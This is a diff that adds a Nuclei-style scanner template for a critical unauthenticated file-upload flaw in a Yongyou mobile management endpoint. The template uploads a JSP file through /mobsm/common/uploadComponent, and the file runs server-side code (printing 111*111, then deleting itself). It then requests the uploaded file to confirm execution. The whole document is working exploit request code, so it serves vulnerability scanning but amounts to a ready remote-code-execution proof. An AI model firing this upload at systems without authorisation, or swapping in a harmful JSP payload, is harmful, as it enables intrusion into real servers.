@@ -1,0 +1,42 @@
+id: yongyou-ydglpt-getemaildata-upload
+info:
+  name: yongyou-ydglpt-getemaildata-upload
+  author: yongyou-ydglpt-getemaildata-upload
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(8))}}"
+  filenametext: "{{to_lower(rand_base(6))}}"
+
+requests:
+  - raw:
+      - |
+        POST /mobsm/common/uploadComponent HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+        Content-Length: 375
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="submit"
+
+        上传
+        ------WebKitFormBoundary{{boundary}}--
+
+      - |
+        GET /mobsm/uploadComponent/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body_1,"ok") && contains(body_2,"12321")'
